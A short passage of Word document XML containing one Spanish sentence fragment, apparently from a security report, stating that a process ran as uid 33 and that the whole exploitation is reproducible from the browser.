      </w:r>
      <w:r>
        <w:t xml:space="preserve"> (uid 33). Toda la explotación es reproducible desde el navegador.*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A3B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A45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